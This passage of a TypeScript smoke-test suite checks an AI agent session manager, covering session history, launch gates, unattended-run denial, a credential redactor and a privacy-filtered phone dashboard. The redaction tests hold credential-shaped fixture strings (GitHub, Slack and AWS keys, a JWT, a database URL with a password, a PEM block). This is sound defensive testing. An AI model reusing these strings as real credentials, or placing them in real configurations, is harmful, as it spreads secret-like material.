    VALUES (?,?,?,?,?,?,?,?,?,'wanigan',?)
  `);
  try {
    // Three physical launches, including one after a provider-profile change,
    // must read as one durable Codex conversation in Recent.
    recentInsert.run(`${recentPrefix}_root`, recentConversation, 'codex', tmp, 'recent smoke', recentAt, recentAt + 10, 0, null, null);
    recentInsert.run(`${recentPrefix}_resume`, recentConversation, 'codex', tmp, 'recent smoke', recentAt + 20, recentAt + 30, 0, `${recentPrefix}_root`, 'codex');
    recentInsert.run(`${recentPrefix}_migrated`, recentConversation, 'codex-renamed', tmp, 'recent smoke', recentAt + 40, recentAt + 50, 0, `${recentPrefix}_resume`, 'codex');
    // Old picker launches have no exact ID. They may stay in the audit log,
    // but must never reappear as an unsafe "resume" card.
    recentInsert.run(`${recentPrefix}_unknown`, null, 'codex', tmp, 'recent smoke', recentAt + 60, recentAt + 70, 0, null, 'codex');
    recentInsert.run(`${recentPrefix}_failed`, null, 'codex', tmp, 'recent smoke', recentAt + 80, recentAt + 90, 1, null, 'codex');
    // A row left open by a process crash becomes interrupted but remains
    // resumable because it has an exact durable conversation ID.
    recentInsert.run(`${recentPrefix}_stale`, staleConversation, 'codex', tmp, 'recent smoke', recentAt + 100, null, null, null, 'codex');

    reconcileAbandonedSessions(recentAt + 200);
    const stale = db().prepare('SELECT ended_at, exit_code FROM session_log WHERE id = ?')
      .get(`${recentPrefix}_stale`) as { ended_at: number | null; exit_code: number | null };
    check(stale.ended_at === recentAt + 200 && stale.exit_code === -1,
      'an abandoned prior-process execution is closed as interrupted');

    const recent = pastSessions(20).filter((row) => row.id.startsWith(recentPrefix));
    const collapsed = recent.find((row) => row.conversationId === recentConversation);
    check(recent.length === 2 && collapsed?.id === `${recentPrefix}_migrated`,
      'Recent contains one newest card per exact conversation, never one per launch', recent.map((row) => row.id));
    check(collapsed?.continuationCount === 3,
      'a renamed provider profile still contributes to the one conversation launch count', collapsed?.continuationCount);
    check(!recent.some((row) => row.id === `${recentPrefix}_unknown` || row.id === `${recentPrefix}_failed`),
      'records with no exact conversation ID are retained off the unsafe Recent resume surface');

    forgetPastSession(`${recentPrefix}_migrated`);
    const remaining = db().prepare('SELECT count(*) AS count FROM session_log WHERE conversation_id = ?')
      .get(recentConversation) as { count: number };
    check(remaining.count === 0,
      'forgetting a Recent conversation removes every duplicate execution record in its lineage');
  } finally {
    db().prepare('DELETE FROM session_log WHERE id LIKE ?').run(`${recentPrefix}%`);
  }

  /* ── sessions · the revert baseline outlives the process ─────────── */
  // A baseline that lived only in memory answered "undo what this agent did"
  // with "this session has no baseline commit" after every quit, and lost the
  // dirty list with it — the list that keeps edits the operator had already
  // made from being offered back as the agent's work.
  say('── sessions · persisted revert baseline');
  const baselinePrefix = `s_smoke_baseline_${Date.now().toString(36)}`;
  const baselineAt = Date.now() - 5_000;
  const baselineHead = '1f2e3d4c5b6a798877665544332211000ffeedd';
  const baselineInsert = db().prepare(`
    INSERT INTO session_log
      (id,provider_id,project_path,project_name,started_at,baseline_head,baseline_dirty_json)
    VALUES (?,?,?,?,?,?,?)
  `);
  try {
    baselineInsert.run(`${baselinePrefix}_kept`, 'claude', tmp, 'baseline smoke', baselineAt,
      baselineHead, JSON.stringify(['src/main/db.ts', 'README.md']));
    baselineInsert.run(`${baselinePrefix}_legacy`, 'claude', tmp, 'baseline smoke', baselineAt, null, null);
    baselineInsert.run(`${baselinePrefix}_corrupt`, 'claude', tmp, 'baseline smoke', baselineAt,
      baselineHead, '{not json');
    baselineInsert.run(`${baselinePrefix}_nohead`, 'claude', tmp, 'baseline smoke', baselineAt,
      null, JSON.stringify(['src/main/db.ts']));

    // No live session exists for any of these ids, so every answer below comes
    // from the persisted columns — the restart case, not the warm-cache one.
    const kept = sessionBaseline(`${baselinePrefix}_kept`);
    check(kept?.head === baselineHead && kept.at === baselineAt
      && kept.dirty.join(',') === 'src/main/db.ts,README.md',
    'a baseline captured before a restart is read back from the row, head and dirty list intact', kept);
    check(sessionBaseline(`${baselinePrefix}_legacy`) === null,
      'a row written before those columns existed answers "no baseline" rather than an empty dirty list that would claim every pre-existing edit as the agent’s work');
    const corrupt = sessionBaseline(`${baselinePrefix}_corrupt`);
    check(corrupt?.head === baselineHead && corrupt.dirty.length === 0,
      'a corrupt dirty list costs attribution, not the head commit a revert needs', corrupt);
    const noHead = sessionBaseline(`${baselinePrefix}_nohead`);
    check(noHead !== null && noHead.head === null && noHead.dirty.length === 1,
      'a repo-less session still records what was already dirty, so nothing is attributed to it either', noHead);
    check(sessionBaseline(`${baselinePrefix}_absent`) === null,
      'and an id with no row at all is null rather than a fabricated empty baseline');
  } finally {
    db().prepare('DELETE FROM session_log WHERE id LIKE ?').run(`${baselinePrefix}%`);
  }

  /* ── sessions · the two refusals that precede a PTY ───────────────── */
  // Both gates answer before provider probing, worktree creation or any
  // injected file exists, so a refusal must leave nothing to roll back. The
  // messages are asserted too: a limit the operator set in Settings is only
  // honoured if the refusal says which control to change.
  say('── sessions · launch gates');
  const gateRoot = path.join(tmp, 'launch-gate');
  fs.mkdirSync(gateRoot, { recursive: true });
  const gateProject = await addProject(gateRoot);
  const priorSlots = getSetting('slots', '{}');
  const gateSpendSession = `s_smoke_gate_spend_${Date.now().toString(36)}`;
  const gateSessionCount = () => (db()
    .prepare('SELECT count(*) AS n FROM session_log WHERE project_id = ?')
    .get(gateProject.id) as { n: number }).n;
  try {
    setSetting('slots', JSON.stringify({ session: 0 }));
    let slotRefusal = '';
    try { await createSession({ providerId: 'claude', projectId: gateProject.id }); }
    catch (error) { slotRefusal = error instanceof Error ? error.message : String(error); }
    check(/held at 0/.test(slotRefusal) && /Settings › Dispatcher/.test(slotRefusal),
      'an interactive launch honours the dispatcher session limit and names the control that would raise it',
      slotRefusal);
    check(gateSessionCount() === 0, 'and the refusal leaves no half-created session behind');

    setSetting('slots', priorSlots);
    // Recorded spend, not a projection: a projected overspend keeps drawing its
    // banner and nothing more, because on the 2nd of a month one expensive
    // session projects over almost any cap.
    db().prepare(`
      INSERT INTO session_log (id,provider_id,project_id,project_path,project_name,started_at)
      VALUES (?,?,?,?,?,?)
    `).run(gateSpendSession, 'claude', gateProject.id, gateRoot, gateProject.name, Date.now());
    db().prepare(`
      INSERT INTO session_api_events (session_id,at,kind,model,cost_usd,in_tokens,out_tokens)
      VALUES (?,?,?,?,?,?,?)
    `).run(gateSpendSession, Date.now(), 'request', 'claude-sonnet-5', 9.5, 1_000, 500);
    spend.setBudget(gateProject.id, 5);
    let budgetRefusal = '';
    try { await createSession({ providerId: 'claude', projectId: gateProject.id }); }
    catch (error) { budgetRefusal = error instanceof Error ? error.message : String(error); }
    check(/monthly budget/.test(budgetRefusal) && /Insights › Budgets/.test(budgetRefusal),
      'a scope already over its recorded cap refuses the launch and says where the cap lives',
      budgetRefusal);
    check(gateSessionCount() === 1,
      'and that refusal adds nothing either — only the spend fixture row is present');
  } finally {
    setSetting('slots', priorSlots);
    spend.setBudget(gateProject.id, 0);
    db().prepare('DELETE FROM session_api_events WHERE session_id = ?').run(gateSpendSession);
    db().prepare('DELETE FROM session_log WHERE id = ?').run(gateSpendSession);
    // If either gate ever stops refusing, the calls above started a real agent.
    // Stop it here rather than leaving a PTY inside the smoke process.
    for (const live of listSessions()) if (live.projectId === gateProject.id) killSession(live.id);
  }

  /* ── phase 2 · the file a session is launched with ─────────────────── */
  say('── phase 2 · hook settings');
  const hs = await hooks.startHookServer();
  type GeneratedHookHandler = { url: string; authorization: string };
  const handlerFromSettings = (file: string | null): GeneratedHookHandler | null => {
    if (!file) return null;
    try {
      const parsed = JSON.parse(fs.readFileSync(file, 'utf8')) as {
        hooks?: { PreToolUse?: Array<{ hooks?: Array<{ url?: unknown; headers?: { Authorization?: unknown } }> }> };
      };
      const handler = parsed.hooks?.PreToolUse?.[0]?.hooks?.[0];
      return typeof handler?.url === 'string' && typeof handler.headers?.Authorization === 'string'
        ? { url: handler.url, authorization: handler.headers.Authorization }
        : null;
    } catch { return null; }
  };
  const hookedId = 's_smoke_hooked';
  const settingsFile = hooks.writeHookSettings(hookedId, tmp);
  check(settingsFile !== null && fs.existsSync(settingsFile),
    'a hook settings file is written for a session on a claude-CLI provider');
  if (settingsFile) {
    const raw = fs.readFileSync(settingsFile, 'utf8');
    const parsed = JSON.parse(raw) as { hooks: Record<string, unknown[]> };
    check(Object.keys(parsed.hooks).includes('PreToolUse') && Object.keys(parsed.hooks).includes('SessionStart'),
      'it subscribes the events the gate and the briefing need', Object.keys(parsed.hooks).length);
    // Wanigan never writes into the user's repository — a tool that edits
    // tracked files to instrument itself turns up in their next commit.
    check(!path.resolve(settingsFile).startsWith(path.resolve(tmp) + path.sep),
      'and it is written outside the project, never into .claude/settings.json');
    const handler = handlerFromSettings(settingsFile);
    check(handler?.url === `http://127.0.0.1:${hs.port}/hook` && /^Bearer [A-Za-z0-9_-]{43}$/.test(handler?.authorization ?? ''),
      'the callback carries an opaque per-session capability, never a session id in its URL');
    hooks.cleanupHookSettings(hookedId);
    check(!fs.existsSync(settingsFile), 'it is deleted when the session ends; it holds a bearer token');
  }

  /* ── phase 19 · a run with nobody at the keyboard ──────────────────── */
  say('── phase 19 · unattended policy');
  const fanRun = 'r_smokefanout';
  const fanProject = 'prj_smokefanout';
  // Exactly what headless.ts builds. It is now bound server-side by an opaque
  // capability rather than sent back by the agent in the callback URL/body.
  const fanId = `h_${fanRun}__${fanProject}`;
  check(fanId.length <= 128,
    'the fan-out id remains a compact key for its server-side hook capability', fanId);

  const fanRepo = path.join(tmp, 'fanout');
  fs.mkdirSync(fanRepo, { recursive: true });
  policy.registerPolicyContext({
    sessionId: fanId, projectId: fanProject, projectPath: fanRepo, trust: 'project', attended: false,
  });
  check(policy.contextForSession(fanId)?.projectId === fanProject,
    'the fan-out registers a context the hook bus can find, since it has no pane to look up');

  // Three existing rules answer 'ask'. An ask handed to a child spawned with
  // stdin on /dev/null is not a checkpoint — it is a row sitting still until its
  // per-repo timeout fires and reports a timeout for something that was only
  // ever waiting to be asked.
  const blind: HookInput = { hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: {} };
  const attended = { sessionId: 's_smoke_pane', projectId: fanProject, projectPath: fanRepo, trust: 'project' as const };
  check(policy.decideFor(attended, blind).decision === 'ask',
    'a write whose target Wanigan cannot read is a question while somebody can answer it');
  const alone = policy.answerFor({ ...attended, attended: false }, blind);
  check(alone?.decision === 'deny', 'and a denial when nobody can — one tool call, not a whole timeout', alone?.decision);
  check((alone?.rule ?? '').endsWith('.unattended'),
    'the rule records which ask it was, so the ledger can be read back afterwards', alone?.rule);
  check(policy.answerFor(attended, blind)?.decision === 'ask',
    'the identical call on an attended session is still asked, not denied');

  // End to end through the live listener, because the unit test above proves
  // nothing about whether a headless config resolves back to its exact context.
  const fanHookFile = hooks.writeHookSettings(fanId, fanRepo);
  const fanHandler = handlerFromSettings(fanHookFile);
  check(fanHandler !== null, 'a headless row receives the same per-session hook capability as a pane');
  const anonymousHookId = 's_smoke_unregistered';
  const anonymousHookFile = hooks.writeHookSettings(anonymousHookId, tmp);
  const anonymousHandler = handlerFromSettings(anonymousHookFile);
  check(anonymousHandler !== null, 'an unregistered session can still authenticate without receiving a guessed policy context');
  const hookPost = (handler: GeneratedHookHandler | null, body: unknown) => {
    if (!handler) throw new Error('The smoke hook settings did not contain an HTTP capability.');
    return fetch(handler.url, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: handler.authorization },
      body: JSON.stringify(body),
    });
  };

  const ledgerBefore = policy.ledger(200).length;
  const wire = await hookPost(fanHandler, {
    hook_event_name: 'PreToolUse', tool_name: 'Write',
    tool_input: { file_path: path.join(tmp, 'not-in-the-worktree.txt') },
  });
  const wireJson = await wire.json() as {
    hookSpecificOutput?: { permissionDecision?: string; permissionDecisionReason?: string };
  };
  check(wireJson.hookSpecificOutput?.permissionDecision === 'deny',
    'a fan-out write outside its worktree is denied over the wire, at the registered trust',
    wireJson.hookSpecificOutput?.permissionDecision);
  const entry = policy.ledger(200)[0];
  check(policy.ledger(200).length > ledgerBefore && entry?.projectId === fanProject,
    'and the ledger names the project it was registered against, not the default', entry?.projectId);

  const started = await hookPost(fanHandler, { hook_event_name: 'SessionStart' });
  const brief = ((await started.json()) as { hookSpecificOutput?: { additionalContext?: string } })
    .hookSpecificOutput?.additionalContext ?? '';
  check(brief.includes(fanRepo),
    'SessionStart tells the agent the directory it is judged against', brief.slice(0, 120));
  // An agent that does not know this reads the denial as a bug and retries it.
  check(/nobody is watching/i.test(brief),
    'and, only for an unattended run, that an unevaluable call is denied rather than queued');

  const anon = await hookPost(anonymousHandler, { hook_event_name: 'SessionStart' });
  check(Object.keys((await anon.json()) as Record<string, unknown>).length === 0,
    'a session with no registered context is told nothing rather than handed a guessed trust level');

  // TRUST_COPY.readonly.detail promised network calls are denied; READ_TOOLS has
  // always allowed WebFetch and WebSearch. The briefing writes its own sentence
  // precisely so no agent is handed a constraint that is not real.
  const roBrief = policy.trustBriefing({ sessionId: null, projectId: null, projectPath: null, trust: 'readonly' });
  check(!/network/i.test(roBrief),
    'the Read-only briefing does not claim network calls are denied — lookups are allowed', roBrief);
  check(!/nobody is watching/i.test(roBrief),
    'and an attended session is not told it is alone');

  policy.releasePolicyContext(fanId);
  hooks.cleanupHookSettings(fanId);
  hooks.cleanupHookSettings(anonymousHookId);
  check(policy.contextForSession(fanId) === null,
    'the context is released with the run, so a later run reusing the id cannot inherit it');

  /* ── one redactor, every surface that persists text ───────────────── */
  // Wanigan grew four of these, of unequal strength, and the policy ledger —
  // the one table built to be exported and mailed to somebody — had the
  // weakest. Each shape below is one the old ledger redactor did not know.
  say('── credential redaction');
  const credentialShapes: { label: string; raw: string; leak: string }[] = [
    { label: 'GitHub personal access token', raw: 'git clone with ghp_abcdefghij0123456789ABCDEFGHIJ', leak: 'ghp_abcdefghij' },
    { label: 'fine-grained GitHub token', raw: 'header github_pat_11ABCDEFG0abcdefghijklmnop set', leak: 'github_pat_11ABCDEFG' },
    { label: 'Slack bot token', raw: 'posting as xoxb-1234567890-abcdefghijkl now', leak: 'xoxb-1234567890' },
    { label: 'AWS access key id', raw: 'AKIAIOSFODNN7EXAMPLE is exported in the shell', leak: 'AKIAIOSFODNN7EXAMPLE' },
    { label: 'webhook signing secret', raw: 'verify against whsec_0123456789abcdefghij first', leak: 'whsec_0123456789' },
    { label: 'JSON web token', raw: 'cookie eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NSJ9.dBjftJeZ4CVPmB92K27uhbUJU1p1r ok', leak: 'eyJzdWIiOiIxMjM0NSJ9' },
    { label: 'URL userinfo', raw: 'psql postgres://admin:hunter2pass@db.internal/app', leak: 'hunter2pass' },
    { label: 'Authorization header', raw: 'Authorization: Bearer sk-ant-0123456789abcdef', leak: 'sk-ant-0123456789abcdef' },
  ];
  const stillLeaking = credentialShapes
    .filter((shape) => redactCredentials(shape.raw).includes(shape.leak))
    .map((shape) => shape.label);
  check(stillLeaking.length === 0,
    'the shared redactor removes every credential shape the exported surfaces can carry', stillLeaking.join(', '));
  const pemBlock = '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAsmokekeymaterial\n-----END RSA PRIVATE KEY-----';
  check(!redactCredentials(pemBlock).includes('smokekeymaterial')
    && !redactCredentials(pemBlock).includes('BEGIN RSA PRIVATE KEY'),
  'and a pasted PEM block is replaced whole rather than line by line');

  // A path can be a signed URL and a Grep pattern is routinely the credential
  // somebody was hunting for. Both used to reach the ledger raw because only
  // the command and the url went through a redactor.
  const redactRule = 'smoke.ledger.redaction';
  const redactCtx = { sessionId: 's_smoke_redact', projectId: fanProject, projectPath: fanRepo, trust: 'project' as const };
  policy.recordDecision(redactCtx, {
    hook_event_name: 'PreToolUse', tool_name: 'Read',
    tool_input: { file_path: '/tmp/export/report.csv?token=ghp_abcdefghij0123456789ABCDEFGHIJ' },
  }, { decision: 'deny', rule: redactRule, reason: 'smoke fixture' });
  policy.recordDecision(redactCtx, {
    hook_event_name: 'PreToolUse', tool_name: 'Grep',
    tool_input: { pattern: 'AKIAIOSFODNN7EXAMPLE' },
  }, { decision: 'deny', rule: redactRule, reason: 'smoke fixture' });
  const redactedRows = policy.ledger(200).filter((row) => row.rule === redactRule);
  check(redactedRows.length === 2
    && !redactedRows.some((row) => row.summary.includes('ghp_abcdefghij'))
    && !redactedRows.some((row) => row.summary.includes('AKIAIOSFODNN7EXAMPLE')),
  'the ledger redacts a signed target path and a search pattern, not only a shell command',
  redactedRows.map((row) => row.summary));
  check(redactedRows.some((row) => row.summary.includes('/tmp/export/report.csv')),
    'while keeping enough of each row to be worth reading back afterwards',
    redactedRows.map((row) => row.summary));

  /* ── the attention queue advances on output ────────────────────────── */
  // An agent streaming a long answer fires no hook events at all, so before the
  // PTY data path was wired to noteOutput the queue called a visibly talking
  // session idle after ninety seconds — and sorted it above the one genuinely
  // stuck on a permission prompt.
  say('── attention · output is life');
  const quiet: Session = {
    id: 's_smoke_attention', providerId: 'claude', projectId: fanProject,
    projectPath: tmp, projectName: 'smoke', title: 'smoke', status: 'running',
    pid: null, exitCode: null, createdAt: Date.now() - 3 * attention.IDLE_MS,
    endedAt: null, unread: 0,
  };
  check(attention.attentionOf(quiet).kind === 'idle',
    'a session with no hook events and no output goes idle', attention.attentionOf(quiet).kind);
  attention.noteOutput(quiet.id, Date.now());
  check(attention.attentionOf(quiet).kind === 'working',
    'terminal output alone brings it back to working', attention.attentionOf(quiet).kind);
  attention.forgetSession(quiet.id);
  check(attention.attentionOf(quiet).kind === 'idle',
    'and the stamp is dropped on exit rather than leaking one map slot per session for the life of the app');

  const oldStop = hooks.recordProviderEvent(quiet.id, 'Stop', null, Date.now() - 60_000);
  const delayedExit = attention.attentionOf({
    ...quiet, status: 'exited', exitCode: 0, endedAt: Date.now(),
  });
  check(oldStop !== null && delayedExit.transitionId === `event:${oldStop.id}`,
    'a clean exit remains the same completed turn even when the user closes it more than ten seconds later');
  hooks.recordProviderEvent(quiet.id, 'UserPromptSubmit');
  const laterTurnExit = attention.attentionOf({
    ...quiet, status: 'exited', exitCode: 0, endedAt: Date.now(),
  });
  check(laterTurnExit.transitionId.startsWith('exit:'),
    'a later turn prevents clean-exit coalescing with an older Stop event');

  const responded: Session = { ...quiet, id: 's_smoke_permission_response', createdAt: Date.now() };
  hooks.recordProviderEvent(responded.id, 'PermissionRequest', 'Waiting for your approval.');
  check(attention.attentionOf(responded).kind === 'permission',
    'a provider lifecycle request enters the asking state');
  hooks.recordProviderEvent(responded.id, 'PermissionResponse');
  check(attention.attentionOf(responded).kind !== 'permission',
    'a neutral provider response clears asking without inventing a successful tool result');

  /* ── the phone fleet is a status surface, not a second transcript ─── */
  say('── phone fleet · privacy boundary');
  const privateMarker = 'PRIVATE-MARKER-DO-NOT-LEAVE';
  const remote = mobileFleetSnapshot([{
    ...quiet,
    projectPath: `/tmp/${privateMarker}`,
    worktree: `/tmp/worktree-${privateMarker}`,
    conversationId: `conversation-${privateMarker}`,
    pid: 42424,
  }], [{
    sessionId: quiet.id,
    kind: 'permission',
    transitionId: 'event:phone-snapshot-smoke',
    since: Date.now() - 1_000,
    label: 'Asking',
    detail: `Bash · cat /tmp/${privateMarker}`,
    tool: 'Bash',
  }], {
    [quiet.id]: { sessionId: quiet.id, ...EMPTY_USAGE, costUsd: 0.12, requests: 2 },
  });
  const remoteJson = JSON.stringify(remote);
  check(remote.sessions[0]?.attention.kind === 'permission' && remote.totals.costUsd === 0.12,
    'the phone snapshot carries attention and aggregate usage');
  check(!remoteJson.includes(privateMarker) && !remoteJson.includes('conversation-') && !remoteJson.includes('42424'),
    'and omits paths, commands, pids, worktrees and conversation ids', remoteJson);
  const redrawnTerminal = mobile.readableTerminal('building 100%\rDone\x1b[K\nvisible\x1bPprivate-control-data\x1b\\ text');
  check(redrawnTerminal === 'Done\nvisible text',
    'the mobile terminal renderer applies carriage-return/erase redraws and removes opaque control strings', redrawnTerminal);
  // Both caps refuse rather than trim, and say so in a sentence. A phone shown
  // half a diff's line counts, or a file list quietly cut to fit, reads as a
  // complete answer, and there is nothing on the screen to tell it from one.
  const hugeDiff = mobile.numstatCounts('x'.repeat(mobile.MOBILE_REPO_LIMITS.diffBytes + 1));
  const smallDiff = mobile.numstatCounts('4\t1\tsrc/kept.txt\0');
  const hugeReply = mobile.repoJson({ files: new Array(40_000).fill({ path: 'a'.repeat(80) }) });
  const smallReply = mobile.repoJson({ files: [] });
  check(hugeDiff.counted === false && /larger than/.test(hugeDiff.counted ? '' : hugeDiff.reason)
    && hugeReply.ok === false && /refused rather than cut short/.test(hugeReply.ok ? '' : hugeReply.error)
    && smallDiff.counted === true && smallDiff.counted && smallDiff.byPath.get('src/kept.txt')?.added === 4
    && smallReply.ok === true,
  'an oversized working-tree reading is refused with a sentence rather than truncated: no half-counted diff, and no file list silently shortened to fit the wire',
  hugeDiff.counted ? 'counted' : hugeDiff.reason);
  // One file's diff is the only thing on this wire made of source lines, so its
  // ceilings refuse whole and say what they refused. Two ceilings, because the
  // sentence has to be able to name a size: a read stopped at the send cap only
  // ever knows the diff was bigger than the number already on the screen, while
  // a read that got further can say 158 KB. Past the read ceiling the honest
  // answer really is 'larger than', and it says that instead of guessing.
  const repoGit = await import('./mobile/git');
  const oversizedPatch = repoGit.patchFor({
    answered: true, out: '+ leaked-hunk-line\n'.repeat(9_000), overRead: false,
  });
  const unreadablePatch = repoGit.patchFor({ answered: true, out: '+ fragment of a hunk', overRead: true });
  const readablePatch = repoGit.patchFor({ answered: true, out: '@@ -1 +1,2 @@\n one\n+two\n', overRead: false });
  const revertedPatch = repoGit.patchFor({ answered: true, out: '', overRead: false });
  const failedPatch = repoGit.patchFor({ answered: false, out: '', overRead: false });
  const oversizedReason = oversizedPatch.ok ? '' : oversizedPatch.reason;
  check(!oversizedPatch.ok && /refused rather than cut short/.test(oversizedReason)
    && / \d+ KB and Wanigan sends at most \d+ KB /.test(oversizedReason)
    && !oversizedReason.includes('leaked-hunk-line')
    && !unreadablePatch.ok && /larger than (?:the )?\d+ MB/.test(unreadablePatch.ok ? '' : unreadablePatch.reason)
    && !revertedPatch.ok && !failedPatch.ok && readablePatch.ok,
  "a file's diff too large for the phone is refused with the size it was and the size allowed, carrying none of the patch it refused — never a hunk truncated into something that reads complete",
  oversizedReason);



  say('── phone fleet · authenticated loopback transport');
  const mobilePort = await unusedLoopbackPort();
  const sourceWithExtras = Object.assign({}, remote, {
    projectPath: `/tmp/${privateMarker}`,
    transcript: privateMarker,
    sessions: remote.sessions.map((session) => Object.assign({}, session, {
      command: `cat /tmp/${privateMarker}`,
      pid: 42424,
    })),
  });
  mobile.configureSnapshotSource(() => sourceWithExtras);
  try {
    check(!mobile.mobileConfig().dashboardEnabled,
      'the phone listener is off by default — installing Wanigan opens no new port');
    const monitor = await mobile.setMobileConfig({ dashboardEnabled: true, port: mobilePort });
    check(monitor.running && monitor.localUrl === `http://127.0.0.1:${mobilePort}/`,
      'an explicit opt-in binds the fixed private endpoint on loopback only', monitor.localUrl);

    const shell = await fetch(monitor.localUrl);
    const shellText = await shell.text();
    check(shell.ok && shell.headers.get('cache-control')?.includes('no-store') === true
      && shell.headers.get('x-frame-options') === 'DENY',
      'the content-free mobile shell is no-store and cannot be framed');
    check(!shellText.includes(privateMarker), 'the unauthenticated shell contains no fleet data');
    check(shellText.includes('Private fleet monitor') && !shellText.includes('Read-only fleet monitor')
      && shellText.includes('Live terminal output') && shellText.includes('data-theme='),
    'the iPad shell labels its monitor state honestly, prepares a focused agent console, and carries an appearance mode');
    // The three connection states live in the page's own script, and the
    // offline suite has no browser to run it in — so this reads the page the
    // server actually served rather than the module source. The one part that
    // is not a string check is the parse: the page's JS is assembled inside a
    // template literal, where a stray backtick or ${ silently escapes into
    // main-process code, and new Function proves the shipped text is at least
    // valid JavaScript before a phone is asked to run it.
    const pageJs = shellText.slice(shellText.indexOf('<script nonce='), shellText.indexOf('</script>'));
    let pageJsParses = true;
    try { new Function(pageJs.slice(pageJs.indexOf('>') + 1)); } catch { pageJsParses = false; }
    check(pageJsParses
      && pageJs.includes("state('live', 'Live · polling every ")
      && pageJs.includes("state('stale', 'Stale · last seen ' + age + ' ago')")
      && pageJs.includes("state('bad', 'Never connected')")
      && pageJs.includes("setConnection(lastGoodAt ? 'stale' : 'never')")
      && shellText.includes('id="stale-note"'),
    'the phone page separates a live Mac, a Mac that has gone quiet with the age of the last reading, and a device that has never reached it — and the script it ships parses as JavaScript');
    // The shell worker's whole risk is one line long: a cached /api/ response
    // would let this page replay a fleet reading tomorrow, which is the lie the
    // rest of this block exists to prevent. Grepping for the guard would prove
    // only that a guard was written, so the worker as served is run here in a
    // stubbed ServiceWorkerGlobalScope and driven with a real fetch event for
    // the status endpoint. It must neither answer it nor store it.
    const workerResponse = await fetch(new URL('sw.js', monitor.localUrl));
    const workerSource = await workerResponse.text();
    check(workerResponse.ok
      && (workerResponse.headers.get('content-type') ?? '').includes('javascript')
      && (shell.headers.get('content-security-policy') ?? '').includes("worker-src 'self'"),
    "the page routes serve the shell worker as JavaScript and the shell's own policy admits it — a nonce cannot be attached to a worker script URL, so without worker-src the page would refuse the registration it just asked for",
    `${workerResponse.status} ${workerResponse.headers.get('content-type') ?? ''}`);

    const workerCache = new Map<string, Response>();
    const workerEvents = new Map<string, (event: unknown) => void>();
    const workerScope = {
      location: { href: `${monitor.localUrl}sw.js` },
      addEventListener: (type: string, fn: (event: unknown) => void) => { workerEvents.set(type, fn); },
      skipWaiting: () => {},
      caches: {
        open: async () => ({
          put: async (key: string, value: Response) => { workerCache.set(String(key), value); },
          match: async (key: string) => workerCache.get(String(key)),
        }),
        keys: async () => [] as string[],
        delete: async () => true,
      },
      clients: { claim: async () => {} },
      crypto: globalThis.crypto,
      // Every network call this worker can make fails, so what follows measures
      // the worker rather than the listener that is still running beside it.
      fetch: async () => { throw new TypeError('Load failed'); },
    };
    new Function('self', workerSource)(workerScope);
    const workerFetch = workerEvents.get('fetch');
    let apiAnswered = false;
    if (workerFetch) {
      workerFetch({
        request: { url: `${monitor.localUrl}api/status`, mode: 'cors', method: 'GET' },
        respondWith: () => { apiAnswered = true; },
      });
    }
    check(typeof workerFetch === 'function' && !apiAnswered && workerCache.size === 0
      && !workerSource.includes('api/status'),
    'the shell service worker leaves every /api/ request on the network untouched — it neither answers one nor puts one in its cache, so no reading of the fleet can be replayed to this device later',
    `${workerCache.size} cached entries, answered: ${apiAnswered}`);

    // And what it does instead. A navigation with nothing cached gets Wanigan's
    // own screen, which names this device's radio rather than guessing at the
    // Mac, and deliberately carries no fleet number to soften the blow.
    const navigation: Promise<Response>[] = [];
    if (workerFetch) {
      workerFetch({
        request: { url: monitor.localUrl, mode: 'navigate', method: 'GET' },
        respondWith: (value: Promise<Response>) => { navigation.push(value); },
      });
    }
    const offlineScreen = navigation.length ? await navigation[0] : null;
    const offlineHtml = offlineScreen ? await offlineScreen.text() : '';
    check(offlineScreen !== null && offlineScreen.status === 200
      && offlineHtml.includes('This device has no network.')
      && offlineHtml.includes('not a reading about the Mac')
      && !offlineHtml.includes('%NONCE%')
      && !/\brunning\b|\bsessions\b|\btokens\b/i.test(offlineHtml),
    "opening the phone app with no network lands on Wanigan's own offline screen rather than the browser's error page, and that screen states this device's missing radio without showing one fleet number",
    offlineScreen ? `${offlineScreen.status} ${offlineHtml.length} bytes` : 'no response');
    const manifest = await fetch(new URL('manifest.webmanifest', monitor.localUrl));
    check(manifest.ok && JSON.parse(await manifest.text()).display === 'standalone',
      'the paired dashboard is installable as an iPad Home Screen web app');

    const apiUrl = new URL('api/status', monitor.localUrl).toString();
    const refused = await fetch(apiUrl);
    check(refused.status === 401, 'fleet state refuses a request with no bearer credential', refused.status);

    const hash = new URLSearchParams(new URL(monitor.pairingUrl).hash.slice(1));
    const token = hash.get('token') ?? '';
    const codePair = await fetch(new URL('api/pair', monitor.localUrl), {
      method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ code: monitor.pairingCode }),
    });
    const pairedByCode = await codePair.json() as { token?: string };
    check(codePair.ok && typeof pairedByCode.token === 'string' && pairedByCode.token === token,
      'a time-limited desktop pairing code exchanges for the same browser credential without copying a URL');
    const accepted = await fetch(apiUrl, { headers: { authorization: `Bearer ${token}` } });
    const body = await accepted.text();
    const acceptedSnapshot = JSON.parse(body) as { sessions?: { attention?: { kind?: string } }[]; appearance?: string; remoteControl?: boolean };
    check(accepted.ok && acceptedSnapshot.sessions?.[0]?.attention?.kind === 'permission'
      && ['system', 'light', 'dark'].includes(acceptedSnapshot.appearance ?? '') && acceptedSnapshot.remoteControl === false,
      'the paired phone receives the current privacy-filtered fleet');
    // The widened scope must not have widened the one beside it. /api/status is
    // re-read with repository review switched on, because a shared sanitiser
    // quietly relaxed to serve the new screen would surface here first and
    // nothing else about this route would look any different.
    setSetting('mobile_repository_review', '1');
    const withReviewOn = await fetch(apiUrl, { headers: { authorization: `Bearer ${token}` } });
    const withReviewText = await withReviewOn.text();
    setSetting('mobile_repository_review', '0');
    check(withReviewOn.ok && !withReviewText.includes(privateMarker) && !withReviewText.includes('42424')
      && !withReviewText.includes('conversation-') && !/[/\\][Uu]sers[/\\]/.test(withReviewText),
      'turning repository review on does not widen /api/status: the fleet route still carries no path, pid or conversation id',
      withReviewText.slice(0, 300));
    // Reading one file's diff is the widest thing this scope does — it is the
    // only route on this wire that carries source lines — so it is driven from
    // the outside, over HTTP, with the opt-in flipped both ways.
    const reviewRepo = path.join(tmp, 'phone-review-repo');
    fs.mkdirSync(reviewRepo, { recursive: true });
    const gitReview = (...args: string[]) =>
      execFileSync('git', ['-C', reviewRepo, ...args], { stdio: 'pipe' }).toString();
